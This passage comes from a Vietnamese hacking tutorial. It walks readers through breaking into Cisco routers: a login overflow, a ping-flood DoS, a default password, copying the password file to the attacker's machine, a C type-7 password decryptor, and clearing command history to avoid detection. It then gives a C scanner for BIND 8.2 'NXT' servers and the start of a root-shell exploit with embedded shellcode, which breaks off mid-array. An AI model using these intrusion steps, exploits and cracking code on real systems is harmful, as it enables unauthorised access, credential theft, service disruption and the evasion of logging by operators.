bạn không cần nhập username , mà nó sẽ đòi password của bạn , lúc này bạn hãy nhập vào một chuỗi password khổng lồ bất kỳ như:<br/><br/><br/> 10293847465qpwoeirutyalskdjfhgzmxn cbv019dsk10293847465qpwo eirutyalskdjfhgzmxncbv019dsk10293847465qpwoeirutyalskdjfhgzmxn cbv019dsk10293847465qpwoeirutyalskdjfhgzmxncbv019dsk10293847465 qpwoeirutyalskdjfhgzmxncbv019dsk10293847465qpwoeirutyalskdjfhg zmxncbv019dsk10293847465qpwoeirutyalskdjfhgzmxncbv019dsk10293847465qpwoeirutyalskdjfhgzmxncbv019dsk<br/><br/> Rồi Enter ! Bạn hãy chờ đợi , có thể hệ thống Cisco sẽ Reboot , Và cũng có thể bạn không thể Hack nếu nhưlúc này hệ thống đang ở chế độ offline .<br/><br/> Nhưng hãy thử chờ 2-10 phút , có thể bạn sẽ được login vào bên trong .<br/><br/> Nếu không xảy ra thì có lẽ nó không phải là chạy 1 software vul . Tại trờng hợp đó bạn hãy làm vài cái Dos attacks bằng cách gửi nhiều lệnh Ping đến hệ thống cho nó down đi cho bõ tức he he ... Bằng cách vào MS-DOS prompt gõ :<br/><br/><br/> ping -l 56550 cisco.router.ip -t -----&gt; he he .. ai bảo không cho ông mày vào .<br/><br/><br/> OK ! Cũng chả sao , trong khi đó bạn hãy lập lại 1 kết nối khác cung tới port 23 . Và đăng nhập mật khẩu là " Admin " .<br/><br/> Các bạn hỏi vì sao password lại la " Admin " . Xin tha rằng đây là password mặc định của chương trình chuyển vận Cisco . ha ha ... Khi đó bạn có thể đăng nhập được vào hệ thống tạm thời , chỉ là tạm thời thôi nha , bởi vì nó sẽ dis bạn ra bất cứ lúc nào .<br/><br/> Bây giờ bạn đã đăng nhập thành công , hay mau tìm file password .<br/><br/> Bạn hãy gõ " ? " sẽ có 1 danh sách các lệnh dùng trong hệ thống hiện ra trước mắt bạn ( Tất nhiên bạn chỉ được quyền hạn sử dụng 1 số lệnh trong này thôi vì bạn chỉ là ngời tạm thời trong hệ thống , nhưng thế là đã quá đủ rồi ) Bạn sẽ nhìn thấy 1 lệnh di chuyển , 1 lệnh copy file , 1 lệnh edit file .. hãy dùng lệnh này để đến nơi chứa file password của Admin ( Mấy chú không biết gì về Nix thì phải xem lại nha ) . Khi tìm thấy file passwd thì hãy gửi về cho mình theo địa chỉ IP của chính mình tren port 23<br/><br/> Nhưng trước khi bạn có thể sent file về cho chính mình bạn phải thiết lập HyperTerminal để đợi tín hiệu từ Cisco Rout .<br/><br/> Bây giờ bạn sent 1 file từ hệ thống về máy bạn ,HyperTerminal sẽ hỏi bạn liệu bạn có chấp nhận file mà máy chủ gửi cho bạn , bạn đồng ý và tìm đờng dẫn cho file save lại<br/><br/><br/> Vậy là bạn đã có trong tay file chứa password của 1 hệ thống chuyển vận Cisco .<br/><br/> File đó có thể là passwd ( nếu nó không bị mã hoá bởi shadow ) , Hoặc là file Shadow password . cũng có thể là master.passwd . Cái này phải tuỳ vào kinh nghiệm của mỗi ngời .<br/><br/><br/> III Cách Crack File Password .<br/><br/><br/> Bạn đã vợt qua được phần khó nhất rồi nên việc Crack này chỉ là chuyện nhỏ .<br/><br/> Cách tôt nhất là bạn nên dùng John the Ripper để Crack nó . Sử dụng cái này rất dễ , bạn chỉ việc đọc hớng dẫn của nó là OK .<br/><br/><br/> Nhưng ngoài ra tôi cũng xin giới thiệu 1 chương trình khác , nó được viết ra chỉ để Crack password của hệ thống Cisco ( Các bạn nên phân biệt password của 1 server chứa website , vơí 1 server chạy Cisco nha , hoàn toàn khác nhau đấy ) . Chương trình này các bạn có thể biên tập trên Linux :<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;
char xlat&#91;&#93; = {
0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f,
0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72,
0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44
};
char pw_str1&#91;&#93; = "password 7 ";
char pw_str2&#91;&#93; = "enable-password 7 ";
char *pname;
cdecrypt&#40;enc_pw, dec_pw&#41;
char *enc_pw;
char *dec_pw;
{
unsigned int seed, i, val = 0;
if&#40;strlen&#40;enc_pw&#41; & 1&#41;
return&#40;-1&#41;;
seed = &#40;enc_pw&#91;0&#93; - '0'&#41; * 10 + enc_pw&#91;1&#93; - '0';
if &#40;seed &gt; 15 || !isdigit&#40;enc_pw&#91;0&#93;&#41; || !isdigit&#40;enc_pw&#91;1&#93;&#41;&#41;
return&#40;-1&#41;;
for &#40;i = 2 ; i &lt;= strlen&#40;enc_pw&#41;; i++&#41; {
if&#40;i !=2 && !&#40;i & 1&#41;&#41; {
dec_pw&#91;i / 2 - 2&#93; = val ^ xlat&#91;seed++&#93;;
val = 0;
}
val *= 16;
if&#40;isdigit&#40;enc_pw&#91;i&#93; = toupper&#40;enc_pw&#91;i&#93;&#41;&#41;&#41; {
val += enc_pw&#91;i&#93; - '0';
continue;
}
if&#40;enc_pw&#91;i&#93; &gt;= 'A' && enc_pw&#91;i&#93; &lt;= 'F'&#41; {
val += enc_pw&#91;i&#93; - 'A' + 10;
continue;
}
if&#40;strlen&#40;enc_pw&#41; != i&#41;
return&#40;-1&#41;;
}
dec_pw&#91;++i / 2&#93; = 0;
return&#40;0&#41;;
}
usage&#40;&#41;
{
fprintf&#40;stdout, "Usage: %s -p &lt;encrypted password&gt;\n", pname&#41;;
fprintf&#40;stdout, " %s &lt;router config file&gt; &lt;output file&gt;\n", pname&#41;;
return&#40;0&#41;;
}
main&#40;argc,argv&#41;
int argc;
char **argv;
{
FILE *in = stdin, *out = stdout;
char line&#91;257&#93;;
char passwd&#91;65&#93;;
unsigned int i, pw_pos;
pname = argv&#91;0&#93;;
if&#40;argc &gt; 1&#41;
{
if&#40;argc &gt; 3&#41; {
usage&#40;&#41;;
exit&#40;1&#41;;
}
if&#40;argv&#91;1&#93;&#91;0&#93; == '-'&#41;
{
switch&#40;argv&#91;1&#93;&#91;1&#93;&#41; {
case 'h':
usage&#40;&#41;;
break;
case 'p':
if&#40;cdecrypt&#40;argv&#91;2&#93;, passwd&#41;&#41; {
fprintf&#40;stderr, "Error.\n"&#41;;
exit&#40;1&#41;;
}
fprintf&#40;stdout, "password: %s\n", passwd&#41;;
break;
default:
fprintf&#40;stderr, "%s: unknow option.", pname&#41;;
}
return&#40;0&#41;;
}
if&#40;&#40;in = fopen&#40;argv&#91;1&#93;, "rt"&#41;&#41; == NULL&#41;
exit&#40;1&#41;;
if&#40;argc &gt; 2&#41;
if&#40;&#40;out = fopen&#40;argv&#91;2&#93;, "wt"&#41;&#41; == NULL&#41;
exit&#40;1&#41;;
}
while&#40;1&#41; {
for&#40;i = 0; i &lt; 256; i++&#41; {
if&#40;&#40;line&#91;i&#93; = fgetc&#40;in&#41;&#41; == EOF&#41; {
if&#40;i&#41;
break;
fclose&#40;in&#41;;
fclose&#40;out&#41;;
return&#40;0&#41;;
}
if&#40;line&#91;i&#93; == '\r'&#41;
i--;
if&#40;line&#91;i&#93; == '\n'&#41;
break;
}
pw_pos = 0;
line&#91;i&#93; = 0;
if&#40;!strncmp&#40;line, pw_str1, strlen&#40;pw_str1&#41;&#41;&#41;
pw_pos = strlen&#40;pw_str1&#41;;
if&#40;!strncmp&#40;line, pw_str2, strlen&#40;pw_str2&#41;&#41;&#41;
pw_pos = strlen&#40;pw_str2&#41;;
if&#40;!pw_pos&#41; {
fprintf&#40;stdout, "%s\n", line&#41;;
continue;
}
if&#40;cdecrypt&#40;&line&#91;pw_pos&#93;, passwd&#41;&#41; {
fprintf&#40;stderr, "Error.\n"&#41;;
exit&#40;1&#41;;
}
else {
if&#40;pw_pos == strlen&#40;pw_str1&#41;&#41;
fprintf&#40;out, "%s", pw_str1&#41;;
else
fprintf&#40;out, "%s", pw_str2&#41;;
fprintf&#40;out, "%s\n", passwd&#41;;
}
}
}
Nếu bạn không chạy Linux , mà chạy Windown chẳng han . Thì bạn lại phải cần 1 chương trình brute-force , nó sẽ cho phép ban chay John the Ripper hoặc Password-Cracker trên Windown . Và sau đó hãy kiên nhẫn chờ đợi . Một hệ thống lớn đang nằm trong tay bạn .
IV Cách sử dụng Router Cisco
Bạn đã có trong tay 1 password của hên thống Cisco , bây giờ hãy làm chủ cái công nghệ tuyệt vời này . Bạn hãy Connect tới hệ thống &#40;Bạn vẫn còn nhớ IP của nó chứ&#41; với password hợp pháp . Nhưng nếu không muốn bị log IP thì hãy thông qua 1 proxy server .
Bạn đã đăng nhập được vào bên trong , Lúc này hệ thống sẽ ghi lại toàn bộ những hành động của bạn bên trong server &#40;nó giống nhưcái History cua IE&#41; . Bạn không muốn mình bị theo dõi như vậy thì hãy gõ lệnh sau :
terminal history size 0
Bây giờ nó sẽ không nhớ bất kỳ cái gì về bạn nữa , chúng ta có thể yên tâm mà khai thác sử dung Rounter này .
Bạn muốn cách sử dụng Rounter ? Hãy gõ " ? " , một loạt các danh sách lệnh của chương trinh Rounter Cisco hiện ra . Và bạn có thể sử dụng hầu hết nó .
Những chương trình vận chuyển Cisco thông thường cho telnet , như vậy bạn có thể dùng telnet kết nối với những hệ thống khác &#40;Bạn thấy nó sớng không , Hack được 1 hệ thống ta có thể có quyền vào những hệ thống khác mà Cisco này đang làm việc&#41;
Bạn có thể sử dụng hệ thống Rounter để chặn đứng các gói dữ liệu được chuyền tới và chuyền đi thông qua hệ thống Cisco này . Hoặc bạn có thể sao chép các dữ liệu các gói hàng , nhưng trong bài viết này tôi sẽ không đề cập đến vấn đề đó vì nó quá sức nguy hiểm
V. Lời Kết
Bạn đừng tức giận hay khóc khi mà không Hack được 1 hệ thống Cisco lần đầu tiên , và thậm chí cả sau này . Nó cần sự thực hành kiên nhẫn từ bạn chứ không như kiểu Hack server khác là 1 nhát được ngay .
Hay tỉ mỉ trong từng bớc bạn sẽ thành công !
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hack BIND 8.2/8.2.1 qua bug "NXT"
Các máy chủ tên miền &#40;DNS server&#41; chạy BIND 8.2/8.2.1 không xử lí chính xác các record NXT. Điều này tạo điều kiện cho attacker có thể làm tràn bộ đệm của BIND và thi hành các mã lệnh độc đoán trên máy chủ tên miền mà cụ thể nhất là lấy root &#40;theo CA-99-14, ngày 10/11/1999&#41;
Dưới đây là cách để hack các máy chủ tên miền chạy BIND 8.2/8.2.1 gặp bug "nxt" nhưng chưa được patch
Bước 1: scan các DNS server gặp bug "nxt" bằng CBIND &#40;cảm ơn Nguyễn Xuân Bình nha&#41;
/* BIND NXT vulnerable SCANNER - CBIND */
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;wait.h&gt;#include &lt;netdb.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;
/* DO NOT EDIT THIS LINE */
#define SCAN_EXE "./nmap -p 53 "
/* EDIT: directory of NMAP */
#define SCAN_DIR "/home/lb0gspm/tmp/nmap/"
/* EDIT: directory of CBIND and it's temporary files */
#define CBIND_DIR "/home/lb0gspm/tmp/cbind/"
#define R1_DIR "/home/lb0gspm/tmp/cbind/result1.cbind"
#define R2_DIR "/home/lb0gspm/tmp/cbind/result2.cbind"
int Scan&#40; char *ip &#41;;
char *GetSubnet&#40; char *ip &#41;;
char *ChangeSubnet&#40; char *ip, char *subnet &#41;;
char *itoa&#40; int i &#41;;
int main&#40; int argc, char *argv&#91;&#93; &#41;
{
struct in_addr addr;
struct hostent *host_entry;
unsigned short int option&#91;3&#93;, i, wait_st;
unsigned char *name;
unsigned char *cmd;
unsigned char *ip, *subnet, *ip_s;
unsigned char *temp;
FILE *fp;
printf&#40; "Check BIND v 2.00b \n" &#41;;
printf&#40; "Bind NXT vulnerablity scanner\n\n" &#41;;
name = &#40;char *&#41;malloc&#40; 200 &#41;;
ip = &#40;char *&#41;malloc&#40; 16 &#41;;
ip_s = &#40;char *&#41;malloc&#40; 16 &#41;;
subnet = &#40;char *&#41;malloc&#40; 4 &#41;;
cmd = &#40;char *&#41;malloc&#40; 50 &#41;;
if&#40; argc == 1 &#41;
{
printf&#40; "Options: \n" &#41;;
printf&#40; " -s SUB-NET SCAN &#40; SLOW BUT HIGH PRECISE &#41;\n" &#41;;
printf&#40; " -f SUB-NET SCAN &#40; FAST BUT LOW PRECISE / NMAP REQUIRE &#41;\n" &#41;;
printf&#40; " -i PRINT INFOMATION\n\n" &#41;;
printf&#40; "Examples: \n" &#41;;
printf&#40; " cbind victim.com &#40; IT WILL SCAN IF TARGET IS VULNERABLE OR NOT &#41;\n" &#41;;
printf&#40; " cbind victim.com -s &#40; IT WILL SCAN ALL SUB-NETs IN DETAIL &#41;\n" &#41;;
printf&#40; " cbind -f victim.com &#40; IT WILL SCAN SUB-NETs LOW PRECISE &#41;\n\n" &#41;;
exit&#40;0&#41;;
} else {
option&#91;0&#93; = 0;
option&#91;1&#93; = 0;
option&#91;2&#93; = 0;
for&#40; i = 1; i &lt; argc; i++ &#41;
{
if&#40; strcmp&#40; argv&#91;i&#93;, "-s" &#41; == 0 &#41;
{
if&#40; option&#91;2&#93; == 1 &#41;
{
printf&#40; "Can not use options -s, -f at the same time.\n" &#41;;
exit&#40;0&#41;;
}
if&#40; option&#91;0&#93; == 1 &#41;
{
printf&#40; "Can not use option -s with -i.\n" &#41;;
exit&#40;0&#41;;
}
printf&#40; "Sub-net&#40; high precise &#41; scan mode ACTIVATED.\n" &#41;;
printf&#40; "It can takes long.\n\n" &#41;;
option&#91;1&#93; = 1;
continue;
}
if&#40; strcmp&#40; argv&#91;i&#93;, "-f" &#41; == 0 &#41;
{
if&#40; option&#91;1&#93; == 1 &#41;
{
printf&#40; "Can not use options -s, -f at the same time.\n" &#41;;
exit&#40;0&#41;;
}
if&#40; option&#91;0&#93; == 1 &#41;
{
printf&#40; "Can not use options -f with -i.\n" &#41;;
exit&#40;0&#41;;
}
printf&#40; "Sub-net&#40; low precise &#41; scan mode ACTIVATED.\n" &#41;;
printf&#40; "It require NMAP 2.07 or higher version.\n\n" &#41;;
option&#91;2&#93; = 1;
continue;
}
if&#40; strcmp&#40; argv&#91;i&#93;, "-i" &#41; == 0 &#41;
{
if&#40; &#40;option&#91;1&#93; == 1&#41; || &#40;option&#91;2&#93; == 1&#41; &#41;
{
printf&#40; "Can not use option -i with -s&#40;or -f&#41;.\n" &#41;;
exit&#40;0&#41;;
}
option&#91;0&#93; = 1;
continue;
}
strcpy&#40; name, argv&#91;i&#93; &#41;;
}
}
if&#40; geteuid&#40;&#41; != 0 &#41;
{
printf&#40; "Error! You are not ROOT!\n" &#41;;
exit&#40;0&#41;;
}
if&#40; &#40;name&#91;0&#93; &lt;= '0'&#41; || &#40;name&#91;0&#93; &gt;= '9'&#41; &#41;
{
host_entry = gethostbyname&#40; name &#41;;
if&#40; host_entry == NULL &#41;
{
if&#40; option&#91;0&#93; != 1 &#41; {
printf&#40; "Can not scan %s.\n", name &#41;;
exit&#40;0&#41;;
}
}
if&#40; option&#91;0&#93; != 1 &#41; {
addr = *&#40;&#40;struct in_addr *&#41;host_entry-&gt;h_addr&#41;;
ip = &#40;unsigned char *&#41;inet_ntoa&#40; addr &#41;;
subnet = GetSubnet&#40; ip &#41;;
}
}
if&#40; &#40;name&#91;0&#93; &gt;= '0'&#41; && &#40;name&#91;0&#93; &lt;= '9'&#41; &#41;
{
host_entry = gethostbyaddr&#40; name, strlen&#40;name&#41;, AF_INET &#41;;
if&#40; host_entry == NULL &#41;
{
if&#40; option&#91;0&#93; != 1 &#41; {
printf&#40; "Can not scan %s.\n", name &#41;;
exit&#40;0&#41;;
}
}
if&#40; option&#91;0&#93; != 1 &#41; {
addr = *&#40;&#40;struct in_addr *&#41;host_entry-&gt;h_addr&#41;;
ip = &#40;unsigned char *&#41;inet_ntoa&#40; addr &#41;;
subnet = GetSubnet&#40; ip &#41;;
}
}
if&#40; &#40;option&#91;1&#93; == 0&#41; && &#40;option&#91;2&#93; == 0&#41; && &#40;option&#91;0&#93; != 1&#41; &#41;
{
Scan&#40; ip &#41;;
printf&#40; "Scanning Done.\n" &#41;;
remove&#40; R1_DIR &#41;;
remove&#40; R2_DIR &#41;;
exit&#40;0&#41;;
}
if&#40; option&#91;1&#93; == 1 &#41;
{
for&#40; i = 0; i &lt; 256; i++ &#41;
{
if&#40; fork&#40;&#41; == 0 &#41;
{
strcpy&#40; subnet, itoa&#40; i &#41; &#41;;
ip_s = ChangeSubnet&#40; ip, subnet &#41;;
Scan&#40; ip_s &#41;;
remove&#40; R1_DIR &#41;;
remove&#40; R2_DIR &#41;;
exit&#40;0&#41;;
} else {
wait&#40; NULL &#41;;
}
continue;
}
printf&#40; "Scanning Done.\n" &#41;;
exit&#40;0&#41;;
}
if&#40; option&#91;2&#93; == 1 &#41;
{
strcpy&#40; cmd, SCAN_EXE &#41;;
strcat&#40; cmd, name &#41;;
strcat&#40; cmd, "/24" &#41;;
strcat&#40; cmd, " &gt; " &#41;;
strcat&#40; cmd, R1_DIR &#41;;
chdir&#40; SCAN_DIR &#41;;
system&#40; cmd &#41;;
strcpy&#40; cmd, "grep \"Interesting\" " &#41;;
strcat&#40; cmd, R1_DIR &#41;;
strcat&#40; cmd, " &gt; " &#41;;
strcat&#40; cmd, R2_DIR &#41;;
system&#40; cmd &#41;;
if&#40; &#40; fp = fopen&#40; R2_DIR, "r" &#41; &#41; &lt; 0 &#41;
{
printf&#40; "File Open Error!\n" &#41;;
exit&#40;0&#41;;
}
while&#40; 1 &#41;
{
bzero&#40; name, 200 &#41;;
temp = &#40;char *&#41;malloc&#40; 200 &#41;;
strcpy&#40; temp, " " &#41;;
temp = fgets&#40; temp, 100, fp &#41;;
if&#40; temp == NULL &#41; break;
if&#40; temp&#91;21&#93; == ' ' &#41;
{
for&#40; i = 0; i &lt; 16; i++ &#41;
{
if&#40; &#40;temp&#91;i+23&#93; != ' '&#41; && &#40;temp&#91;i+23&#93; != '&#41;'&#41; &#41;
{
if&#40; &#40;temp&#91;i+23&#93; &gt;= '0'&#41; && &#40;temp&#91;i+23&#93; &lt;= '9'&#41; &#41;
{
name&#91;i&#93; = temp&#91;i+23&#93;;
} else {
if&#40; temp&#91;i+23&#93; == '.' &#41;
name&#91;i&#93; = temp&#91;i+23&#93;;
}
}
}
}
if&#40; temp&#91;21&#93; != ' ' &#41;
{
for&#40; i = 0; i &lt; 50; i++ &#41;
{
if&#40; temp&#91;i+21&#93; != ' ' &#41; name&#91;i&#93; = temp&#91;i+21&#93;;
}
}
Scan&#40; name &#41;;
free&#40;temp&#41;;
}
remove&#40; R1_DIR &#41;;
remove&#40; R2_DIR &#41;;
}
if&#40; option&#91;0&#93; == 1 &#41;
{
printf&#40; "Creator : Laks Bluesky\n" &#41;;
printf&#40; "E-mail : &lt;a href="mailto:lb0gspm@hanmail.net"&gt;lb0gspm@hanmail.net&lt;/a&gt;\n\n" &#41;;
printf&#40; "Version : 2.00 beta\n\n" &#41;;
printf&#40; "2000.06.19\n" &#41;;
exit&#40;0&#41;;
}
}
char *itoa&#40; int i &#41;
{
char *ret;
char c;
int count;
ret = &#40;char *&#41;malloc&#40; 4 &#41;;
count = 1;
if&#40; i &gt; 9 &#41; count = 2;
if&#40; i &gt; 99 &#41; count = 3;
if&#40; count == 1 &#41;
{
c = i+48;
ret&#91;0&#93; = c;
ret&#91;1&#93; = '\0';
return ret;
}
if&#40; count == 2 &#41;
{
c = i / 10;
i = i - &#40;c*10&#41;;
ret&#91;0&#93; = c+48;
ret&#91;1&#93; = i+48;
ret&#91;2&#93; = '\0';
return ret;
}
if&#40; count == 3 &#41;
{
c = i / 100;
i = i - &#40;c*100&#41;;
ret&#91;0&#93; = c+48;
c = i / 10;
i = i - &#40;c*10&#41;;
ret&#91;1&#93; = c+48;
ret&#91;2&#93; = i+48;
ret&#91;3&#93; = '\0';
return ret;
}
}
char *ChangeSubnet&#40; char *ip, char *subnet &#41;
{
char *ip_s;
int count = 0, i = 0;
ip_s = &#40;char *&#41;malloc&#40; 16 &#41;;
strcpy&#40; ip_s, ip &#41;;
for&#40; count = 0; count != 3; count = count &#41;
{
if&#40; ip_s&#91;i&#93; == '.' &#41;
{
count++;
i++;
continue;
}
i++;
}
ip_s&#91;i++&#93; = subnet&#91;0&#93;;
ip_s&#91;i++&#93; = subnet&#91;1&#93;;
ip_s&#91;i++&#93; = subnet&#91;2&#93;;
ip_s&#91;i++&#93; = subnet&#91;3&#93;;
return ip_s;
}
char *GetSubnet&#40; char *ip &#41;
{
char *ret;
int count = 0, i = 0;
ret = &#40;char *&#41;malloc&#40; 4 &#41;;
for&#40; count = 0; count != 3; count = count &#41;
{
if&#40; ip&#91;i&#93; == '.' &#41;
{
count++;
i++;
continue;
}
i++;
}
ret&#91;0&#93; = ip&#91;i++&#93;;
ret&#91;1&#93; = ip&#91;i++&#93;;
ret&#91;2&#93; = ip&#91;i++&#93;;
ret&#91;3&#93; = ip&#91;i++&#93;;
return ret;
}
int Scan&#40; char *ip &#41;
{
unsigned short int i;
unsigned char c;
unsigned char *cmd;
unsigned char *version;
FILE *fp;
struct stat result;
cmd = &#40;char *&#41;malloc&#40; 200 &#41;;
version = &#40;char *&#41;malloc&#40; 9 &#41;;
printf&#40; "Scanning... %s\n", ip &#41;;
strcpy&#40; cmd, "dig @&quot; &#41;;
strcat&#40; cmd, ip &#41;;
strcat&#40; cmd, " version.bind chaos txt &gt; " &#41;;
strcat&#40; cmd, R1_DIR &#41;;
strcat&#40; cmd, " 2&gt; /dev/null" &#41;;
system&#40; cmd &#41;;
strcpy&#40; cmd, "grep \"VERSION.BIND.\" " &#41;;
strcat&#40; cmd, R1_DIR &#41;;
strcat&#40; cmd, " &gt; " &#41;;
strcat&#40; cmd, R2_DIR &#41;;
system&#40; cmd &#41;;
stat&#40; R2_DIR, &result &#41;;
if&#40; result.st_size &lt; 30 &#41;
{
chdir&#40; CBIND_DIR &#41;;
return 0;
}
if&#40; &#40; fp = fopen&#40; R2_DIR, "r" &#41; &#41; &gt;= 0 &#41;
{
for&#40; i = 0; i &lt; 29; i++ &#41;
{
c = fgetc&#40; fp &#41;;
}
for&#40; i = 0; i &lt; 9; i++ &#41;
{
c = fgetc&#40; fp &#41;;
if&#40; c == '"' &#41;
{
version&#91;i&#93; = '\0';
break;
}
version&#91;i&#93; = c;
}
} else {
chdir&#40; CBIND_DIR &#41;;
return 0;
}
if&#40; strcmp&#40; version, "8.2" &#41; == 0 &#41;
{
printf&#40; "%s: IT IS VULNERABLE! ", ip &#41;;
printf&#40; "Try it. \n" &#41;;
chdir&#40; CBIND_DIR &#41;;
return 0;
}
if&#40; strcmp&#40; version, "8.2.1" &#41; == 0 &#41;
{
printf&#40; "%s: IT IS VULNERABLE! ", ip &#41;;
printf&#40; "Try it. \n" &#41;;
chdir&#40; CBIND_DIR &#41;;
return 0;
}
if&#40; strcmp&#40; version, "8.2.2" &#41; == 0 &#41;
{
printf&#40; "%s: IT IS VULNERABLE! ", ip &#41;;
printf&#40; "Try it. \n" &#41;;
chdir&#40; CBIND_DIR &#41;;
return 0;
}
if&#40; strcmp&#40; version, "8.2.2-P5" &#41; == 0 &#41;
{
chdir&#40; CBIND_DIR &#41;;
return 0;
}
if&#40; strcmp&#40; version, "8.1.2" &#41; == 0 &#41;
{
chdir&#40; CBIND_DIR &#41;;
return 0;
}
chdir&#40; CBIND_DIR &#41;;
return 0;
}
* Bạn có thể dùng hai tiện ích sẵn có trong Linux là DIG và NSLOOKUP để nhận diện version của BIND
NSLOOKUP
# nslookup
Default Server: ns.yourco.bogus
Address: 333.333.333.333
&gt; set class=chaos&gt; set type=txt
&gt; version.bind
Server: ns.yourco.bogus
Address: 333.333.333.333
VERSION.BIND text = "8.2.2-P5"
&gt;DIG &#40;cú pháp lệnh: dig @&lt;server_ip&gt; &lt;domain&gt; &lt;query-type&gt; &lt;query-class&gt;&#41;
dig version.bind txt chaos @&lt;server&gt;hoặc
dig @ txt chaos version.bind
Nếu bạn thấy trên màn hình 8.2 hoặc 8.2.2 nghĩa là server này có thể gặp bug "nxt"
Bước 2: lấy root shell bằng T666
#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;time.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;arpa/nameser.h&gt;#include &lt;netdb.h&gt;
char linuxcode&#91;&#93;=
{0xe9,0xac,0x1,0x0,0x0,0x5e,0x89,0x76,0xc,0x8d,0x46,0x8,0x89,0x46,0x10,0x8d,
0x46,0x2e,0x89,0x46,0x14,0x56,0xeb,0x54,0x5e,0x89,0xf3,0xb9,0x0,0x0,0x0,0x0,
0xba,0x0,0x0,0x0,0x0,0xb8,0x5,0x0,0x0,0x0,0xcd,0x80,0x50,0x8d,0x5e,0x2,0xb9,
0xff,0x1,0x0,0x0,0xb8,0x27,0x0,0x0,0x0,0xcd,0x80,0x8d,0x5e,0x2,0xb8,0x3d,0x0,
0x0,0x0,0xcd,0x80,0x5b,0x53,0xb8,0x85,0x0,0x0,0x0,0xcd,0x80,0x5b,0xb8,0x6,
0x0,0x0,0x0,0xcd,0x80,0x8d,0x5e,0xb,0xb8,0xc,0x0,0x0,0x0,0xcd,0x80,0x89,0xf3,
0xb8,0x3d,0x0,0x0,0x0,0xcd,0x80,0xeb,0x2c,0xe8,0xa7,0xff,0xff,0xff,0x2e,0x0,
0x41,0x44,0x4d,0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,
0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,
0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x0,0x5e,0xb8,0x2,0x0,0x0,0x0,0xcd,0x80,0x89,
0xc0,0x85,0xc0,0xf,0x85,0x8e,0x0,0x0,0x0,0x89,0xf3,0x8d,0x4e,0xc,0x8d,0x56,
0x18,0xb8,0xb,0x0,0x0,0x0,0xcd,0x80,0xb8,0x1,0x0,0x0,0x0,0xcd,0x80,0xe8,0x75,
0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x74,0x68,0x69,0x73,0x69,0x73,
0x73,0x6f,0x6d,0x65,0x74,0x65,0x6d,0x70,0x73,0x70,0x61,0x63,0x65,0x66,0x6f,
0x72,0x74,0x68,0x65,0x73,0x6f,0x63,0x6b,0x69,0x6e,0x61,0x64,0x64,0x72,0x69,
0x6e,0x79,0x65,0x61,0x68,0x79,0x65,0x61,0x68,0x69,0x6b,0x6e,0x6f,0x77,0x74,
0x68,0x69,0x73,0x69,0x73,0x6c,0x61,0x6d,0x65,0x62,0x75,0x74,0x61,0x6e,0x79,
0x77,0x61,0x79,0x77,0x68,0x6f,0x63,0x61,0x72,0x65,0x73,0x68,0x6f,0x72,0x69,
0x7a,0x6f,0x6e,0x67,0x6f,0x74,0x69,0x74,0x77,0x6f,0x72,0x6b,0x69,0x6e,0x67,
0x73,0x6f,0x61,0x6c,0x6c,0x69,0x73,0x63,0x6f,0x6f,0x6c,0xeb,0x86,0x5e,0x56,
0x8d,0x46,0x8,0x50,0x8b,0x46,0x4,0x50,0xff,0x46,0x4,0x89,0xe1,0xbb,0x7,0x0,
0x0,0x0,0xb8,0x66,0x0,0x0,0x0,0xcd,0x80,0x83,0xc4,0xc,0x89,0xc0,0x85,0xc0,
0x75,0xda,0x66,0x83,0x7e,0x8,0x2,0x75,0xd3,0x8b,0x56,0x4,0x4a,0x52,0x89,0xd3,
0xb9,0x0,0x0,0x0,0x0,0xb8,0x3f,0x0,0x0,0x0,0xcd,0x80,0x5a,0x52,0x89,0xd3,
0xb9,0x1,0x0,0x0,0x0,0xb8,0x3f,0x0,0x0,0x0,0xcd,0x80,0x5a,0x52,0x89,0xd3,
0xb9,0x2,0x0,0x0,0x0,0xb8,0x3f,0x0,0x0,0x0,0xcd,0x80,0xeb,0x12,0x5e,0x46,
0x46,0x46,0x46,0x46,0xc7,0x46,0x10,0x0,0x0,0x0,0x0,0xe9,0xfe,0xfe,0xff,0xff,
0xe8,0xe9,0xff,0xff,0xff,0xe8,0x4f,0xfe,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,
0x73,0x68,0x0,0x2d,0x63,0x0,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
0xff,0xff,0xff,0xff,0x0,0x0,0x0,0x0,0x70,0x6c,0x61,0x67,0x75,0x65,0x7a,0x5b,
0x41,0x44,0x4d,0x5d,0x31,0x30,0x2f,0x39,0x39,0x2d};
char sc&#91;&#93;=
{0x40,0x0,0x0,0x2e,0x1,0x0,0x0,0x0,0x90,0x3,0xe0,0xd5,0x92,0x10,0x20,0x0,
0x82,0x10,0x20,0x5,0x91,0xd0,0x20,0x0,0xa0,0x10,0x0,0x8,0x90,0x3,0xe0,0xcc,
0x92,0x10,0x21,0xff,0x82,0x10,0x20,0x50,0x91,0xd0,0x20,0x0,0x90,0x3,0xe0,
0xcc,0x82,0x10,0x20,0x3d,0x91,0xd0,0x20,0x0,0x90,0x10,0x0,0x10,0x82,0x10,
